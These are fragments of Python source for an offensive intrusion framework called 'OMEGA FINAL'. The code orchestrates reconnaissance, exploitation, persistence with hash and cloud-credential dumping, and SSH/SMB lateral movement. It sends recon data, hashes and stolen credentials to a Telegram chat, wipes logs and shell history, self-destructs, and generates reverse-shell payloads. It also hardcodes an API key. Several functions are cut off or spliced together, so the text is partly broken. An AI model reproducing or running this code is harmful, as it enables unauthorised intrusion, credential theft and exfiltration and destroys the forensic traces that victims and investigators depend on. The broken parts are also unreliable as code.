PHASE_DEPENDENCIES: Dict[int, List[int]] = {
    1: [],
    2: [1],
    3: [1, 2],
    4: [1, 2, 3]
}


def orchestrate_full_scan(
    self,
    targets: List[str],
    phases: Optional[List[int]] = None,
    parallel: bool = False,
    max_workers: int = 10,
    resume: bool = False,
    checkpoint_id: Optional[int] = None
) -> Dict[str, Any]:
    """
    Orchestrate the full scan with all phases in sequence or parallel.

    Args:
        targets: List of target domains, IPs, or CIDRs
        phases: List of phase numbers to run (default: all 4 phases)
        parallel: If True, run targets in parallel using ThreadPoolExecutor
        max_workers: Maximum number of parallel workers
        resume: If True, resume from last checkpoint
        checkpoint_id: Specific checkpoint ID to resume from

    Returns:
        Dict with 'success', 'results', 'errors', 'summary' keys

    Example:
        >>> result = self.orchestrate_full_scan(["example.com"], phases=[1,2,3,4], parallel=True)
        >>> print(result['summary']['total_subdomains'])
        1247
    """
    self.print_header("🚀 ORCHESTRATING FULL SCAN", "START")

    if phases is None:
        phases = [1, 2, 3, 4]

    # Validate phase dependencies
    self._validate_phase_dependencies(phases)

    results = {
        'success': False,
        'scan_id': self.scan_id,
        'targets': targets,
        'phases': phases,
        'start_time': datetime.datetime.now().isoformat(),
        'results': {},
        'errors': [],
        'summary': {},
        'checkpoints': []
    }

    self._save_checkpoint('orchestration_start', 'full', {'targets': targets, 'phases': phases})

    # Handle resume from checkpoint
    if resume:
        checkpoint_data = self._load_last_checkpoint()
        if checkpoint_data:
            self.logger.info(f"Resuming from checkpoint: {checkpoint_data.get('step')}")
            results['checkpoints'].append(checkpoint_data)

    if checkpoint_id:
        checkpoint_data = self._load_checkpoint_by_id(checkpoint_id)
        if checkpoint_data:
            self.logger.info(f"Resuming from checkpoint ID: {checkpoint_id}")
            results['checkpoints'].append(checkpoint_data)
            if checkpoint_data.get('data'):
                try:
                    prev_results = json.loads(checkpoint_data['data'])
                    results['results'] = prev_results.get('results', {})
                    results['errors'] = prev_results.get('errors', [])
                except Exception:
                    pass

    try:
        if parallel:
            with ThreadPoolExecutor(max_workers=max_workers) as executor:
                future_to_target = {
                    executor.submit(self.orchestrate_single_target, target, phases, resume): target
                    for target in targets
                }
                for future in as_completed(future_to_target):
                    target = future_to_target[future]
                    try:
                        target_results = future.result()
                        results['results'][target] = target_results
                        if not target_results.get('success', False):
                            results['errors'].append(f"Target {target} failed: {target_results.get('error', 'Unknown error')}")
                    except Exception as e:
                        results['errors'].append(f"Target {target} failed with exception: {e}")
                        results['results'][target] = {'success': False, 'error': str(e)}
        else:
            for target in targets:
                self.print_header(f"Processing target: {target}", "STEP")
                target_results = self.orchestrate_single_target(target, phases, resume)
                results['results'][target] = target_results
                if not target_results.get('success', False):
                    results['errors'].append(f"Target {target} failed: {target_results.get('error', 'Unknown error')}")

        results['success'] = len(results['errors']) == 0

        summary = {
            'total_targets': len(targets),
            'successful_targets': len(targets) - len(results['errors']),
            'failed_targets': len(results['errors']),
            'total_subdomains': 0,
            'total_ports': 0,
            'total_vulnerabilities': 0,
            'total_credentials': 0,
            'total_exfiltrated': 0,
            'total_shells': 0,
            'total_persistence': 0,
            'total_lateral': 0,
            'elapsed_seconds': 0
        }

        for target, tr in results['results'].items():
            target_summary = tr.get('summary', {})
            summary['total_subdomains'] += target_summary.get('subdomains_found', 0)
            summary['total_ports'] += target_summary.get('open_ports', 0)
            summary['total_vulnerabilities'] += target_summary.get('vulnerabilities', 0)
            summary['total_credentials'] += target_summary.get('credentials', 0)
            summary['total_exfiltrated'] += target_summary.get('exfiltrated_files', 0)
            summary['total_shells'] += target_summary.get('shells', 0)
            summary['total_persistence'] += target_summary.get('persistence', 0)
            summary['total_lateral'] += target_summary.get('lateral_movement', 0)

        elapsed = time.time() - self.start_time
        summary['elapsed_seconds'] = elapsed

        results['summary'] = summary
        results['end_time'] = datetime.datetime.now().isoformat()

        self._save_checkpoint('orchestration_end', 'full', results)

        self.print_summary_table(summary)
        self.print_header(f"✅ Full scan orchestration complete", "DONE")

    except Exception as e:
        results['error'] = str(e)
        results['success'] = False
        self.logger.error(f"Orchestration failed: {e}")

    return results


def _validate_phase_dependencies(
    self,
    phases: List[int]
) -> None:
    """
    Validate that phase dependencies are satisfied.

    Args:
        phases: List of phase numbers

    Returns:
        None

    Raises:
        ValueError: If dependencies are not satisfied

    Example:
        >>> self._validate_phase_dependencies([2])
        ValueError: Phase 2 requires phase 1
    """
    for phase in phases:
        deps = PHASE_DEPENDENCIES.get(phase, [])
        for dep in deps:
            if dep not in phases:
                raise ValueError(f"Phase {phase} requires phase {dep}")


def orchestrate_single_target(
    self,
    target: str,
    phases: Optional[List[int]] = None,
    resume: bool = False
) -> Dict[str, Any]:
    """
    Run all phases on a single target with checkpoint recovery.

    Args:
        target: Target domain, IP, or CIDR
        phases: List of phase numbers to run (default: all 4 phases)
        resume: If True, resume from last checkpoint

    Returns:
        Dict with 'success', 'target', 'phases', 'results' keys

    Example:
        >>> result = self.orchestrate_single_target("example.com", [1,2,3,4])
        >>> print(result['success'])
        True
    """
    if phases is None:
        phases = [1, 2, 3, 4]

    self._validate_phase_dependencies(phases)

    self.print_header(f"🎯 Orchestrating single target: {target}", "STEP")

    result = {
        'success': False,
        'target': target,
        'phases': phases,
        'start_time': datetime.datetime.now().isoformat(),
        'results': {},
        'errors': [],
        'summary': {}
    }

    checkpoint_key = f"target_{target}"
    self._save_checkpoint('orchestration_target_start', target, {'phases': phases})

    try:
        completed_phases = []
        if resume:
            completed_phases = self._get_completed_phases(target)

        for phase in phases:
            if phase in completed_phases:
                self.print_header(f"Phase {phase} already completed, skipping", "INFO")
                continue

            # Run phase based on number
            if phase == 1:
                result['results']['phase1'] = self._run_phase_1(target)
            elif phase == 2:
                result['results']['phase2'] = self._run_phase_2(target)
            elif phase == 3:
                result['results']['phase3'] = self._run_phase_3(target)
            elif phase == 4:
                result['results']['phase4'] = self._run_phase_4(target)

            self._save_checkpoint(f'phase{phase}_complete', target, result)

        result['summary'] = self._build_phase_summary(result['results'])
        result['success'] = len(result['errors']) == 0
        result['end_time'] = datetime.datetime.now().isoformat()

        self._save_checkpoint('orchestration_target_end', target, result)

    except Exception as e:
        result['error'] = str(e)
        result['success'] = False
        self.logger.error(f"Target orchestration failed for {target}: {e}")

    return result


def _get_completed_phases(
    self,
    target: str
) -> List[int]:
    """
    Get completed phases for a target from checkpoints.

    Args:
        target: Target identifier

    Returns:
        List of completed phase numbers

    Example:
        >>> phases = self._get_completed_phases("example.com")
        >>> print(phases)
        [1, 2]
    """
    try:
        self.db_cursor.execute("""
            SELECT step FROM checkpoints
            WHERE target = ? AND step LIKE 'phase%_complete'
            ORDER BY id DESC
        """, (target,))
        rows = self.db_cursor.fetchall()
        completed = []
        for row in rows:
            step = row[0]
            if step.startswith('phase') and step.endswith('_complete'):
                phase_num = int(step[5:step.index('_')])
                completed.append(phase_num)
        return list(set(completed))
    except Exception:
        return []

            'persistence_installed': persistence_installed,
            'hashes': hashes.get('hashes', []),
            'ntlm_hashes': ntlm_hashes.get('hashes', []),
            'cloud_creds': cloud_creds
        }

        result['summary'] = {
            'persistence': len(persistence_installed),
            'hashes_dumped': len(hashes.get('hashes', [])),
            'ntlm_hashes_dumped': len(ntlm_hashes.get('hashes', [])),
            'cloud_creds_found': len(cloud_creds)
        }

        result['success'] = True
        self.print_header(f"Phase 3 complete for {target}", "DONE")

    except Exception as e:
        result['error'] = str(e)
        result['success'] = False
        self.logger.error(f"Phase 3 failed for {target}: {e}")

    return result


def _run_phase_4(
    self,
    target: str
) -> Dict[str, Any]:
    """
    Run Phase 4: Lateral Movement & Exfiltration.

    Args:
        target: Target domain, IP, or hostname

    Returns:
        Dict with 'success', 'summary', 'data' keys

    Example:
        >>> result = self._run_phase_4("example.com")
        >>> print(result['summary']['lateral_movement'])
        2
    """
    self.print_header(f"↔️ Phase 4: Lateral Movement on {target}", "STEP")

    result = {
        'success': False,
        'target': target,
        'phase': 4,
        'summary': {},
        'data': {}
    }

    try:
        creds = self._get_stored_credentials()
        lateral_results = []

        if creds:
            for cred in creds[:5]:
                if 'ssh' in cred.get('type', ''):
                    ssh_result = self.lateral_movement_ssh(
                        target,
                        cred.get('username', 'root'),
                        cred.get('password', '')
                    )
                    if ssh_result and ssh_result.get('success'):
                        lateral_results.append(ssh_result)
                        self.print_found("SHELL", f"SSH lateral movement to {target}")

                if 'smb' in cred.get('type', '') or 'hash' in cred.get('type', ''):
                    smb_result = self.lateral_movement_smb(
                        target,
                        cred.get('username', ''),
                        cred.get('password', ''),
                        cred.get('hash', '')
                    )
                    if smb_result and smb_result.get('success'):
                        lateral_results.append(smb_result)
                        self.print_found("SHELL", f"SMB lateral movement to {target}")

        exfil_results = []
        if self.telegram:
            recon_data = self._get_recon_data(target)
            if recon_data:
                data_str = json.dumps(recon_data, indent=2)
                self.exfil_telegram(data_str, f"Recon data for {target}", as_document=True)

            hashes = self._get_stored_hashes()
            if hashes:
                hash_str = '\n'.join(hashes)
                self.exfil_telegram(hash_str, f"Hashes for {target}", as_document=True)

            creds_str = json.dumps(creds, indent=2)
            self.exfil_telegram(creds_str, f"Credentials for {target}", as_document=True)

            exfil_results.append({'method': 'telegram', 'success': True})

        self.wipe_all_logs(target)
        self.wipe_all_history()

        result['data'] = {
            'lateral_results': lateral_results,
            'exfil_results': exfil_results
        }

        result['summary'] = {
            'lateral_movement': len(lateral_results),
            'exfiltrated': len(exfil_results)
        }

        result['success'] = True
        self.print_header(f"Phase 4 complete for {target}", "DONE")

    except Exception as e:
        result['error'] = str(e)
        result['success'] = False
        self.logger.error(f"Phase 4 failed for {target}: {e}")

    return result


def _get_recon_data(

def _get_stored_credentials(
    self
) -> List[Dict[str, Any]]:
    """

    Example:
        >>> creds = self._get_stored_credentials()
        >>> print(len(creds))
        5
    """
    try:
        self.db_cursor.execute("""
            SELECT username, password, credential_type, source
            FROM credentials
            WHERE username != '' OR password != ''
        """)
        rows = self.db_cursor.fetchall()
        return [dict(row) for row in rows]
    except Exception:
        return []

    """
    try:
        self.db_cursor.execute("""
            SELECT hash FROM credentials
            WHERE hash != ''
        """)
        rows = self.db_cursor.fetchall()
        return [row[0] for row in rows]
    except Exception:
        return []


def _build_phase_summary(
    self,
    phase_results: Dict[str, Any]
) -> Dict[str, Any]:
    """
    Build a summary from phase results.

    Args:
        phase_results: Dictionary of phase results

    Returns:
        Summary dictionary

    Example:
        >>> summary = self._build_phase_summary(phase_results)
        >>> print(summary['subdomains_found'])
        1247
    """
    summary = {
        'subdomains_found': 0,
        'open_ports': 0,
        'technologies': 0,
        'vulnerabilities': 0,
        'credentials': 0,
        'exfiltrated_files': 0,
        'wafs_detected': 0,
        'honeypots': 0,
        'apis_found': 0,
        'cves_exploited': 0,
        'shells': 0,
        'persistence': 0,
        'telegram_alerts': 0,
        'elapsed_seconds': 0
    }

    for phase_name, phase_result in phase_results.items():
        if isinstance(phase_result, dict):
            phase_summary = phase_result.get('summary', {})
            for key in summary.keys():
                if key in phase_summary:
                    summary[key] += phase_summary.get(key, 0)

    return summary


def _save_checkpoint(
    self,
    step: str,
    target: str,
    data: Any
) -> None:
    """
    Save a checkpoint to database.

    Args:
        step: Step name
        target: Target identifier
        data: Data to save

    Returns:
        None

    Example:
        >>> self._save_checkpoint('phase1_complete', 'example.com', {'subdomains': 10})
    """
    try:
        self.db_cursor.execute("""
            INSERT INTO checkpoints (phase, step, target, data, checksum, timestamp)
            VALUES (1, ?, ?, ?, ?, datetime('now'))
        """, (
            step,
            target,
            json.dumps(data, default=str),
            hashlib.md5(str(data).encode()).hexdigest()
        ))
        self.db_conn.commit()
    except Exception as e:
        self.logger.debug(f"Checkpoint save failed: {e}")


def _load_last_checkpoint(

            SELECT * FROM checkpoints
            ORDER BY id DESC LIMIT 1

    except Exception:
        return None

def rollback_to_checkpoint(
    self,
    checkpoint_id: int
) -> bool:
    """
    Rollback to a specific checkpoint.

    Args:
        checkpoint_id: Checkpoint ID to rollback to

    Returns:
        True if successful, False otherwise

    Example:
        >>> success = self.rollback_to_checkpoint(5)
        >>> print(success)
        True
    """
    self.print_danger(f"Rolling back to checkpoint {checkpoint_id}")

    try:
        checkpoint = self._load_checkpoint_by_id(checkpoint_id)
        if not checkpoint:
            self.logger.error(f"Checkpoint {checkpoint_id} not found")
            return False

        self.logger.info(f"Rolling back to: {checkpoint.get('step')} for target {checkpoint.get('target')}")

        if checkpoint.get('data'):
            data = json.loads(checkpoint['data'])
            self.state.update(data)

        self._save_state()

        self.print_found("SHELL", f"Rollback to checkpoint {checkpoint_id} successful")
        return True

    except Exception as e:
        self.logger.error(f"Rollback failed: {e}")
        return False


def _load_targets(
    self,
    target_arg: str
) -> List[str]:
    """
    Load targets from argument.

    Args:
        target_arg: Target string or file path

    Returns:
        List of targets

    Example:
        >>> targets = self._load_targets("example.com")
        >>> print(targets)
        ['example.com']
    """
    if not target_arg:
        return []

    if os.path.isfile(target_arg):
        with open(target_arg, 'r') as f:
            return [line.strip() for line in f if line.strip()]
    else:
        return [target_arg]

def run_cli(
    self
) -> int:
    """
    Run the CLI with parsed arguments.

    Returns:
        Exit code (0 for success, 1 for error)

    Example:
        >>> exit_code = self.run_cli()
        >>> print(exit_code)
        0
    """
    args = self.parse_arguments()

    if args.config_file:
        self._load_config_file(args.config_file)

    if args.interactive:
        return self._interactive_mode()

    if args.no_color:
        global COLORAMA_AVAILABLE
        COLORAMA_AVAILABLE = False

    self.quiet = args.quiet

    self.use_tor = args.tor
    self.threads = args.threads
    self.output_dir = Path(args.output)
    self.telegram_token = args.telegram_token
    self.telegram_chat = args.telegram_chat
    self.self_destruct = args.self_destruct
    self.enable_dangerous = args.dangerous
    self.stealth_mode = args.stealth

    self._setup_directories()
    self._setup_logging()
    self._setup_db()
    self._setup_telegram()
    self._load_state()

    try:
        if args.rollback:
            return self._handle_rollback(args)

        if args.generate_payload:
            return self._handle_payload_generation(args)

        if args.cleanup:
            return self._handle_cleanup(args)

        targets = self._load_targets(args.target)
        if not targets:
            self.logger.error("No targets specified")
            return 1

        if args.full:
            result = self.orchestrate_full_scan(
                targets,
                phases=[1, 2, 3, 4],
                parallel=args.parallel,
                max_workers=args.workers,
                resume=args.resume,
                checkpoint_id=args.checkpoint
            )
        elif args.phase:
            result = self.orchestrate_full_scan(
                targets,
                phases=[args.phase],
                parallel=args.parallel,
                max_workers=args.workers,
                resume=args.resume,
                checkpoint_id=args.checkpoint
            )
        elif args.recon:
            result = self.orchestrate_full_scan(
                targets,
                phases=[1],
                parallel=args.parallel,
                max_workers=args.workers,
                resume=args.resume,
                checkpoint_id=args.checkpoint
            )
        elif args.exploit:
            result = self.orchestrate_full_scan(
                targets,
                phases=[2],
                parallel=args.parallel,
                max_workers=args.workers,
                resume=args.resume,
                checkpoint_id=args.checkpoint
            )
        elif args.persist:
            result = self.orchestrate_full_scan(
                targets,
                phases=[3],
                parallel=args.parallel,
                max_workers=args.workers,
                resume=args.resume,
                checkpoint_id=args.checkpoint
            )
        elif args.lateral:
            result = self.orchestrate_full_scan(
                targets,
                phases=[4],
                parallel=args.parallel,
                max_workers=args.workers,
                resume=args.resume,
                checkpoint_id=args.checkpoint
            )
        else:
            result = self.orchestrate_full_scan(
                targets,
                phases=[1, 2, 3, 4],
                parallel=args.parallel,
                max_workers=args.workers,
                resume=args.resume,
                checkpoint_id=args.checkpoint
            )

        if args.report:
            self.generate_full_report(result, format=args.format)

        self._save_state()

        return 0 if result.get('success', False) else 1

    except KeyboardInterrupt:
        self.print_header("🛑 Interrupted by user", "STOP")
        self._save_state()
        return 130
    except Exception as e:
        self.logger.error(f"CLI execution failed: {e}")
        if args.verbose:
            traceback.print_exc()
        return 1
    finally:
        self._cleanup()


def _interactive_mode(
    self
) -> int:
    """
    Interactive CLI mode with command history and tab completion.

    Returns:
        Exit code (0 for success, 1 for error)

    Example:
        >>> exit_code = self._interactive_mode()
        >>> print(exit_code)
        0
    """
    self.print_header("🎮 Interactive Mode", "START")
    self.print_header("Type 'help' for commands, 'exit' to quit", "INFO")

    commands = {
        'scan': 'Scan a target: scan example.com --full',
        'recon': 'Run reconnaissance: recon example.com',
        'exploit': 'Run exploitation: exploit example.com',
        'persist': 'Run persistence: persist example.com',
        'lateral': 'Run lateral movement: lateral example.com',
        'payload': 'Generate payload: payload windows reverse_tcp 192.168.1.1 4444',
        'report': 'Generate report: report json',
        'status': 'Show current status',
        'checkpoints': 'List available checkpoints',
        'rollback': 'Rollback to checkpoint: rollback 5',
        'cleanup': 'Clean up traces',
        'clear': 'Clear screen',
        'help': 'Show this help',
        'exit': 'Exit interactive mode'
    }

    try:
        while True:
            try:
                cmd_input = input("\n[omega]> ").strip()
                if not cmd_input:
                    continue

                parts = cmd_input.split()
                cmd = parts[0].lower()

                if cmd == 'exit':
                    break

                if cmd == 'help':
                    for c, desc in commands.items():
                        print(f"  {c:12} - {desc}")
                    continue

                if cmd == 'clear':
                    os.system('clear' if os.name == 'posix' else 'cls')
                    continue

                if cmd == 'status':
                    self._print_status()
                    continue

                if cmd == 'checkpoints':
                    self._list_checkpoints()
                    continue

                if cmd == 'rollback':
                    if len(parts) < 2:
                        print("Usage: rollback <checkpoint_id>")
                        continue
                    try:
                        checkpoint_id = int(parts[1])
                        self.rollback_to_checkpoint(checkpoint_id)
                    except ValueError:
                        print("Invalid checkpoint ID")
                    continue

                if cmd == 'cleanup':
                    self._handle_cleanup(None)
                    continue

                if cmd == 'payload':
                    if len(parts) < 2:
                        print("Usage: payload <platform> [shell_type] [ip] [port]")
                        continue
                    platform = parts[1]
                    shell_type = parts[2] if len(parts) > 2 else 'reverse_tcp'
                    ip = parts[3] if len(parts) > 3 else '0.0.0.0'
                    port = int(parts[4]) if len(parts) > 4 else 4444
                    payload = self.generate_payload(platform, shell_type, port, ip)
                    print(f"Generated payload: {payload['filename']}")
                    print(f"Size: {payload['size']} bytes")
                    if payload['content']:
                        print("\n--- Content ---")
                        print(payload['content'][:500])
                    continue

                if cmd == 'scan':
                    if len(parts) < 2:
                        print("Usage: scan <target> [--full] [--phase N] [--parallel]")
                        continue
                    target = parts[1]
                    phases = [1, 2, 3, 4]
                    parallel = False
                    if '--full' in parts:
                        phases = [1, 2, 3, 4]
                    if '--phase' in parts:
                        idx = parts.index('--phase')
                        if idx + 1 < len(parts):
                            try:
                                phases = [int(parts[idx + 1])]
                            except ValueError:
                                print("Invalid phase number")
                                continue
                    if '--parallel' in parts:
                        parallel = True
                    result = self.orchestrate_full_scan([target], phases, parallel)
                    print(f"Scan complete: {'Success' if result['success'] else 'Failed'}")
                    continue

                if cmd == 'recon':
                    if len(parts) < 2:
                        print("Usage: recon <target>")
                        continue
                    result = self._run_phase_1(parts[1])
                    print(f"Recon complete: {'Success' if result['success'] else 'Failed'}")
                    continue

                if cmd == 'exploit':
                    if len(parts) < 2:
                        print("Usage: exploit <target>")
                        continue
                    result = self._run_phase_2(parts[1])
                    print(f"Exploit complete: {'Success' if result['success'] else 'Failed'}")
                    continue

                if cmd == 'persist':
                    if len(parts) < 2:
                        print("Usage: persist <target>")
                        continue
                    result = self._run_phase_3(parts[1])
                    print(f"Persistence complete: {'Success' if result['success'] else 'Failed'}")
                    continue

                if cmd == 'lateral':
                    if len(parts) < 2:
                        print("Usage: lateral <target>")
                        continue
                    result = self._run_phase_4(parts[1])
                    print(f"Lateral complete: {'Success' if result['success'] else 'Failed'}")
                    continue

                if cmd == 'report':
                    fmt = parts[1] if len(parts) > 1 else 'json'
                    if self.results:
                        self.generate_full_report(self.results.to_dict(), fmt)
                        print(f"Report generated in {fmt} format")
                    else:
                        print("No results to report")
                    continue

                print(f"Unknown command: {cmd}")

            except KeyboardInterrupt:
                print("\n[!] Interrupted")
                continue
            except Exception as e:
                print(f"[!] Error: {e}")

    except KeyboardInterrupt:
        pass

    self.print_header("👋 Exiting interactive mode", "STOP")
    return 0

def _load_config_file(
    self,
    config_path: str
) -> None:
    """
    Load configuration from file (JSON or YAML).

    Args:
        config_path: Path to configuration file

    Returns:
        None

    Example:
        >>> self._load_config_file("config.json")
    """
    path = Path(config_path)
    if not path.exists():
        self.logger.warning(f"Config file not found: {config_path}")
        return

    try:
        if path.suffix in ['.yaml', '.yml'] and YAML_AVAILABLE:
            with open(path, 'r') as f:
                config = yaml.safe_load(f)
        else:
            with open(path, 'r') as f:
                config = json.load(f)

        if isinstance(config, dict):
            self.config.update(config)
            self.logger.info(f"Loaded config from {config_path}")
        else:
            self.logger.warning(f"Invalid config format in {config_path}")

    except Exception as e:
        self.logger.warning(f"Could not load config: {e}")

def generate_full_report(
    self,
    data: Dict[str, Any],
    format: str = 'json'
) -> Dict[str, Any]:
    """
    Generate complete report with all phases.

    Args:
        data: Data from scan orchestration
        format: Report format ('json', 'html', 'pdf', 'csv', 'markdown')

    Returns:
        Dict with 'success', 'path', 'format' keys

    Example:
        >>> report = self.generate_full_report(data, format='json')
        >>> print(report['path'])
        /root/omega_final/output/reports/report_20260727_143215.json
    """
    self.print_header(f"📄 Generating report (format: {format})", "STEP")

    result = {
        'success': False,
        'format': format,
        'path': '',
        'error': ''
    }

    try:
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"omega_report_{timestamp}"

        if format == 'json':
            path = REPORTS_DIR / f"{filename}.json"
            with open(path, 'w') as f:
                json.dump(data, f, indent=2, default=str)
            result['path'] = str(path)
            result['success'] = True
            self.print_header(f"JSON report saved: {path}", "DONE")

        elif format == 'html':
            html_content = self._generate_html_report(data)
            path = REPORTS_DIR / f"{filename}.html"
            with open(path, 'w') as f:
                f.write(html_content)
            result['path'] = str(path)
            result['success'] = True
            self.print_header(f"HTML report saved: {path}", "DONE")

        elif format == 'pdf':
            if WEASYPRINT_AVAILABLE:
                html_content = self._generate_html_report(data)
                html_path = REPORTS_DIR / f"{filename}.html"
                with open(html_path, 'w') as f:
                    f.write(html_content)
                pdf_path = REPORTS_DIR / f"{filename}.pdf"
                weasyprint.HTML(filename=str(html_path)).write_pdf(str(pdf_path))
                result['path'] = str(pdf_path)
                result['success'] = True
                self.print_header(f"PDF report saved: {pdf_path}", "DONE")
            else:
                result['error'] = "weasyprint not available, falling back to HTML"
                self._generate_html_report(data)
                result['path'] = str(REPORTS_DIR / f"{filename}.html")
                result['success'] = True

        elif format == 'csv':
            csv_content = self._generate_csv_report(data)
            path = REPORTS_DIR / f"{filename}.csv"
            with open(path, 'w') as f:
                f.write(csv_content)
            result['path'] = str(path)
            result['success'] = True
            self.print_header(f"CSV report saved: {path}", "DONE")

        elif format == 'markdown':
            md_content = self._generate_markdown_report(data)
            path = REPORTS_DIR / f"{filename}.md"
            with open(path, 'w') as f:
                f.write(md_content)
            result['path'] = str(path)
            result['success'] = True
            self.print_header(f"Markdown report saved: {path}", "DONE")

        else:
            result['error'] = f"Unsupported format: {format}"

        if self.telegram and result['success']:
            self.telegram.send_document(
                Path(result['path']),
                caption=f"OMEGA FINAL Report - {timestamp}"
            )

    except Exception as e:
        result['error'] = str(e)
        self.logger.error(f"Report generation failed: {e}")

    return result

API_KEYS: Dict[str, str] = {
    'default': 'omega_api_key_2026'
}


def _validate_api_key(
    api_key: Optional[str] = None
) -> bool:
    """
    Validate API key.

    Args:
        api_key: API key to validate

    Returns:
        True if valid, False otherwise

    Example:
        >>> valid = self._validate_api_key("omega_api_key_2026")
        >>> print(valid)
        True
    """
    if not api_key:
        return False
    return any(api_key == key for key in API_KEYS.values())


def run_scan(
    target: Union[str, List[str]],
    output_dir: str = "./output",
    config: Optional[Dict[str, Any]] = None,
    phases: Optional[List[int]] = None,
    api_key: Optional[str] = None
) -> Dict[str, Any]:
    """
    External API: Run full scan on target(s).

    Args:
        target: Single target or list of targets
        output_dir: Output directory path
        config: Optional configuration dictionary
        phases: List of phases to run (default: all 4)
        api_key: API key for authentication

    Returns:
        Dict with scan results

    Example:
        >>> from omega_final import run_scan
        >>> result = run_scan("example.com", "./results", {"threads": 500}, api_key="omega_api_key_2026")
        >>> print(result['summary']['total_subdomains'])
        1247
    """
    if not _validate_api_key(api_key):
        return {'success': False, 'error': 'Invalid API key'}

    if config is None:
        config = {}
    config['output_dir'] = output_dir

    if isinstance(target, str):
        targets = [target]
    else:
        targets = list(target)

    recon = ReconPhase1(config)
    return recon.orchestrate_full_scan(targets, phases=phases)

def cleanup_api(
    self_destruct: bool = False,
    api_key: Optional[str] = None
) -> Dict[str, Any]:
    """
    External API: Clean up all traces.

    Args:
        self_destruct: If True, enable self-destruct
        api_key: API key for authentication

    Returns:
        Dict with cleanup results

    Example:
        >>> from omega_final import cleanup_api
        >>> result = cleanup_api(self_destruct=True, api_key="omega_api_key_2026")
        >>> print(result['success'])
        True
    """
    if not _validate_api_key(api_key):
        return {'success': False, 'error': 'Invalid API key'}

    recon = ReconPhase1({})
    result = {'success': False, 'actions': []}

    try:
        recon.wipe_all_logs()
        result['actions'].append('logs_wiped')
        recon.wipe_all_history()
        result['actions'].append('history_cleared')

        if self_destruct:
            recon.self_destruct_phase()
            result['actions'].append('self_destructed')

        result['success'] = True
    except Exception as e:
        result['error'] = str(e)

    return result
